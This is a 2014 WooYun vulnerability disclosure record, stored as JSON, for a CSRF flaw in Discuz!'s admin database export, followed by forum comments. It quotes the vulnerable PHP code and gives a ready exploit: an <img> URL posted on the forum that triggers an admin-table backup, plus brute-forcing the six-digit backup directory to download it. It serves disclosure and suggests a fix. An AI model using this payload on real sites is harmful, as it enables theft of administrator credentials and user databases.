{"id": 1443, "wybug_id": "wooyun-2014-064886", "wybug_title": "Discuz可CSRF脱裤", "wybug_corp": "Discuz!", "wybug_author": "Matt", "wybug_date": "2014-06-14 10:58", "wybug_open_date": "2014-09-12 11:00", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向公众公开  简要描述： Discuz CSRF脱裤！广告位 承接代码审计 codescan.cn codescan#yeah.net 详细说明：  \nadmin_db.phpif(!$backupdir) {\t$backupdir = random(6);\t@mkdir('./data/backup_'.$backupdir, 0777);//文件夹名是六位随机数\tC::t('common_setting')->update('backupdir',$backupdir);/            } else {//这边也没有做fromhash的验证 估计是方便AJAX请求~\t\tDB::query('SET SQL_QUOTE_SHOW_CREATE=0', 'SILENT');\t\tif(!$_GET['filename'] || !preg_match('/^[\\w\\_]+$/', $_GET['filename'])) {\t\t\tcpmsg('database_export_filename_invalid', '', 'error');\t\t}\t\t$time = dgmdate(TIMESTAMP);\t\tif($_GET['type'] == 'discuz' || $_GET['type'] == 'discuz_uc') {\t\t\t$tables = arraykeys2(fetchtablelist($tablepre), 'Name');\t\t} elseif($_GET['type'] == 'custom') {\t\t\t$tables = array();\t\t\tif(empty($_GET['setup'])) {\t\t\t\t$tables = C::t('common_setting')->fetch('custombackup', true);\t\t\t} else {\t\t\t\tC::t('common_setting')->update('custombackup', empty($_GET['customtables'])? '' : $_GET['customtables']);\t\t\t\t$tables = & $_GET['customtables'];\t\t\t}\t\t\tif( !is_array($tables) || empty($tables)) {\t\t\t\tcpmsg('database_export_custom_invalid', '', 'error');\t\t\t}\t\t}\t\t$memberexist = array_search(DB::table('common_member'), $tables);\t\tif($memberexist !== FALSE) {\t\t\tunset($tables[$memberexist]);\t\t\tarray_unshift($tables, DB::table('common_member'));\t\t}\t\t$volume = intval($_GET['volume']) + 1;\t\t$idstring = '# Identify: '.base64_encode(\"$_G[timestamp],\".$_G['setting']['version'].\",{$_GET['type']},{$_GET['method']},{$volume},{$tablepre},{$dbcharset}\").\"\\n\";\t\t$dumpcharset = $_GET['sqlcharset'] ? $_GET['sqlcharset'] : str_replace('-', '', $_G['charset']);\t\t$setnames = ($_GET['sqlcharset'] && $db->version() > '4.1' && (!$_GET['sqlcompat'] || $_GET['sqlcompat'] == 'MYSQL41')) ? \"SET NAMES '$dumpcharset';\\n\\n\" : '';\t\tif($db->version() > '4.1') {\t\t\tif($_GET['sqlcharset']) {\t\t\t\tDB::query('SET NAMES %s', array($_GET['sqlcharset']));\t\t\t}\t\t\tif($_GET['sqlcompat'] == 'MYSQL40') {\t\t\t\tDB::query(\"SET SQL_MODE='MYSQL40'\");\t\t\t} elseif($_GET['sqlcompat'] == 'MYSQL41') {\t\t\t\tDB::query(\"SET SQL_MODE=''\");\t\t\t}\t\t}\t\t$backupfilename = './data/'.$backupdir.'/'.str_replace(array('/', '\\\\', '.', \"'\"), '', $_GET['filename']);//文件名可控\t\tif($_GET['usezip']) {\t\t\trequire_once './source/class/class_zip.php';\t\t}\t\tif($_GET['method'] == 'multivol') {\t\t\t$sqldump = '';\t\t\t$tableid = intval($_GET['tableid']);\t\t\t$startfrom = intval($_GET['startfrom']);\t\t\tif(!$tableid && $volume == 1) {\t\t\t\tforeach($tables as $table) {\t\t\t\t\t$sqldump .= sqldumptablestruct($table);\t\t\t\t}\t\t\t}\t\t\t$complete = TRUE;\t\t\tfor(; $complete && $tableid < count($tables) && strlen($sqldump) + 500 < $_GET['sizelimit'] * 1000; $tableid++) {\t\t\t\t$sqldump .= sqldumptable($tables[$tableid], $startfrom, strlen($sqldump));\t\t\t\tif($complete) {\t\t\t\t\t$startfrom = 0;\t\t\t\t}\t\t\t}\t\t\t$dumpfile = $backupfilename.\"-%s\".'.sql';\t\t\t!$complete && $tableid--;\t\t\tif(trim($sqldump)) {\t\t\t\t$sqldump = \"$idstring\".\t\t\t\t\t\"# <?php exit();?>\\n\".\t\t\t\t\t\"# Discuz! Multi-Volume Data Dump Vol.$volume\\n\".\t\t\t\t\t\"# Version: Discuz! {$_G[setting][version]}\\n\".\t\t\t\t\t\"# Time: $time\\n\".\t\t\t\t\t\"# Type: {$_GET['type']}\\n\".\t\t\t\t\t\"# Table Prefix: $tablepre\\n\".\t\t\t\t\t\"#\\n\".\t\t\t\t\t\"# Discuz! Home: http://www.discuz.com\\n\".\t\t\t\t\t\"# Please visit our website for newest infomation about Discuz!\\n\".\t\t\t\t\t\"# --------------------------------------------------------\\n\\n\\n\".\t\t\t\t\t\"$setnames\".\t\t\t\t\t$sqldump;\t\t\t\t$dumpfilename = sprintf($dumpfile, $volume);\t\t\t\t\t\t\t\t@$fp = fopen($dumpfilename, 'wb');\t\t\t\t@flock($fp, 2);\t\t\t\tif(@!fwrite($fp, $sqldump)) {\t\t\t\t\t\t\t\t\t@fclose($fp);\t\t\t\t\tcpmsg('database_export_file_invalid', '', 'error');\t\t\t\t} else {\t\t\t\t\tfclose($fp);\t\t\t\t\tif($_GET['usezip'] == 2) {\t\t\t\t\t\t$fp = fopen($dumpfilename, \"r\");\t\t\t\t\t\t$content = @fread($fp, filesize($dumpfilename));\t\t\t\t\t\tfclose($fp);\t\t\t\t\t\t$zip = new zipfile();\t\t\t\t\t\t$zip->addFile($content, basename($dumpfilename));//写出\t\t\t\t\t\t$fp = fopen(sprintf($backupfilename.\"-%s\".'.zip', $volume), 'w');\t\t\t\t\t\tif(@fwrite($fp, $zip->file()) !== FALSE) {\t\t\t\t\t\t\t@unlink($dumpfilename);\t\t\t\t\t\t}\t\t\t\t\t\techo $dumpfilename;exit();\t\t\t\t\t\tfclose($fp);\t\t\t\t\t}\t\t\t\t\tunset($sqldump, $zip, $content);\n   漏洞证明：  利用方法前台发贴插入SRC<img src=\"http://127.0.0.1/x32/admin.php?action=db&operation=export&setup=1&scrolltop=&anchor=&type=custom&customtables%5B%5D=pre_ucenter_admins&method=multivol&sizelimit=2048&extendins=0&sqlcompat=&usehex=1&usezip=0&filename=ssccad&exportsubmit=%CC%E1%BD%BB22\">其中表明和文件名可控缺少一个dir的name但是dir是一个6位纯数字data/backup_123456/xxx.sql这样我们可以对这个数字进行暴力破解就可以了6位数字 跑个一宿还是能出来的 直接脱裤啊\n\n   修复方案：  验证fromhash   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-16 09:22 厂商回复： 感谢您提出的问题，我们尽快予以修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-14 11:07 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  轻松社掉楼主邮箱。。。    \n     2014-06-14 11:09 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  不会吧，全版本吗？    \n     2014-06-14 11:11 |    \t\t帅爆的小烬烬 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:25        | 路上有个漂亮妹子和我搭讪，知道我赶着去挖...)\t\t \n  洞主你这么屌，DZ知道吗？    \n     2014-06-14 11:25 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  火前留！待雷劈    \n     2014-06-14 11:31 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  火前留！待雷劈    \n     2014-06-14 11:38 |    \t\tChriSt \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        )\t\t \n  火前留！待雷劈    \n     2014-06-14 11:39 |    \t\t凌枫 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 菜鸟求罩  _(:з”∠)_)\t\t \n  火钳，花生饮料矿泉水 啤酒香烟瓜子糖    \n     2014-06-14 11:46 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  这是要火的节奏    \n     2014-06-14 11:56 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  火前留！待雷劈     \n     2014-06-14 12:03 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @冷静 真的假的。。    \n     2014-06-14 12:22 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  火前留！待雷劈    \n     2014-06-14 12:37 |    \t\t乡间小路 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 关注网络安全。)\t\t \n  火前留名！    \n     2014-06-14 13:20 |    \t\tHUC缘生 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:29        | 小白求罩~~~~)\t\t \n  火前留！待雷劈    \n     2014-06-14 13:58 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  打的一手好广告。    \n     2014-06-14 14:26 |    \t\t1fn0 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:7        | 我是运维 不要开除我)\t\t \n  火前刘明    \n     2014-06-14 14:29 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  @小杰哥 请问你是如何做到只交5个洞成为实习白帽子的？    \n     2014-06-14 14:37 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  @迦南    0.0   大牛，见笑了，我是个渣渣    \n     2014-06-14 15:14 |    \t\tkider脚本小子 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 系统软件安装及其调试。电脑硬件问题检测...)\t\t \n  火钳    \n     2014-06-14 15:30 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这个牛逼，希望是真的。    \n     2014-06-14 15:53 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  卧槽！！！求脱裤    \n     2014-06-14 16:13 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  这样的话，好多库要被脱，求姿势    \n     2014-06-14 17:18 |    \t\t兔兔侠 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  裤子穿好了。    \n     2014-06-14 17:52 |    \t\t李白 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:29        )\t\t \n  为啥不雷劈？    \n     2014-06-14 17:54 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  可怕！！    \n     2014-06-14 18:01 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  果然打雷了    \n     2014-06-14 18:01 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  @小杰哥 大牛求指导（T_T）    \n     2014-06-14 18:04 |    \t\t90sid \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | (*^__^*))\t\t \n  我勒个擦    \n     2014-06-14 18:07 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  果然雷劈了    \n     2014-06-14 19:06 |    \t\t千域千寻 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | 帝吼天啸关山震 皇天后土伏做臣)\t\t \n  那些年错过的裤子，我已经听到了它们在颤抖了    \n     2014-06-16 09:35 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  火前留名    \n     2014-06-16 09:49 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  一大波裤子正在路上...    \n     2014-06-16 09:53 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  屌炸天，mark    \n     2014-06-16 09:57 |    \t\t大坑哥 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 大家好，我是大坑。)\t\t \n  mark，牛x    \n     2014-06-17 16:31 |    \t\t奋斗小菜鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 前行中)\t\t \n  让DZ的暴风雨来的更猛烈一些吧。    \n     2014-06-19 09:46 |    \t\tlck丶 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 求大牛拿0day砸死)\t\t \n  mark!目测一大波站要挂    \n     2014-06-19 10:43 |    \t\tlazypig \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 如果你决定了方向,勇气可以带你走的更远。)\t\t \n  mark    \n     2014-06-19 11:54 |    \t\tWalle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:5        | ...   位卑、未敢忘忧国！   ...)\t\t \n  牛的一比、、    \n     2014-06-19 13:13 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  卧槽！就给钱了    \n     2014-06-19 13:20 |    \t\t小李子 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 资深菜鸟，追求技术的纯粹，小玩叫折腾，大...)\t\t \n  @U神 那么快……@疯狗 是不是漏洞叼了就提前给了？审核下我的吧狗哥！！    \n     2014-06-19 13:22 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @U神 那么快……@疯狗 是不是漏洞叼了就提前给了？审核下我的吧狗哥！！  登错号了，日，QQ浏览器啊…帮朋友看下审核的漏洞，忘了，他记住密码了，一激动    \n     2014-06-19 13:33 |    \t\tabcdlzy \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:14        | 好好学习，天天向上。)\t\t \n  卧槽！就给钱了     \n     2014-06-19 14:14 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Mosuan 我一直看到发奖金停留在5月8日，这个屌漏洞太吊了，都提前打了    \n     2014-06-19 14:17 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  3个dollar符，卧槽，传说中的1w块？    \n     2014-06-19 14:56 |    \t\t裙下的秘密 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:9        | )\t\t \n  这个碉堡了，等看了    \n     2014-06-19 15:56 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @U神 sql注入是不是最少五百？    \n     2014-06-19 16:53 |    \t\tfeiyu \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        )\t\t \n  坐等结果    \n     2014-06-19 17:21 |    \t\tovens \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:3        | 身是菩提树，心如明镜台； 时时勤拂拭，勿...)\t\t \n  坐等结果     \n     2014-06-19 20:18 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  全版本么    \n     2014-06-19 20:46 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  $$$    \n     2014-06-19 21:46 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-06-19 21:52 |    \t\t逗b炮 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        | muyou)\t\t \n  坐等公开    \n     2014-06-20 00:25 |    \t\t芙兰朵露斯卡雷特 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 看我闪现逃走闪现逃走六不六)\t\t \n  卧槽牛逼    \n     2014-06-20 07:48 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  又是打雷又是三个dollar的，这得多少钱啊……    \n     2014-06-20 08:50 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  @Matt 洞主，你能告诉我你为啥那么牛逼？   看你提交的洞里面   10个有8个带＄符号的，请问洞主你是土豪吗？    \n     2014-06-20 12:41 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  好给力啊，一个精华加三倍WB！    \n     2014-06-20 12:44 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @疯狗 狗哥，这不会是$$$*2=$$$$$$吧 精华奖金双倍啊    \n     2014-06-20 16:15 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  土豪我们做朋友吧    \n     2014-06-20 17:56 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  多倍经验多倍金币    \n     2014-06-21 09:06 |    \t\tCotton \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 爱好web渗透安全，专注于学习社会工程学)\t\t \n  火前留！待雷劈    \n     2014-06-21 10:14 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  估计是通过csrf备份数据库 从而导致脱裤    \n     2014-06-21 10:46 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @felixk3y 这个假设挺合理的 我也投一票    \n     2014-06-21 15:21 |    \t\tMax \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:7        | When you see this sentence, I have been ...)\t\t \n  火钳刘翔    \n     2014-06-26 09:59 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @mramydnei 确实是这样。    \n     2014-09-12 14:07 |    \t\t孤零落叶寒 \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:26        | 今天的跌倒是是为了明天更好的站着)\t\t \n  我看见$$$进来的    \n     2014-09-12 21:35 |    \t\tsutdy \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:33        | 0.0)\t\t \n  我看见$$$进来的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}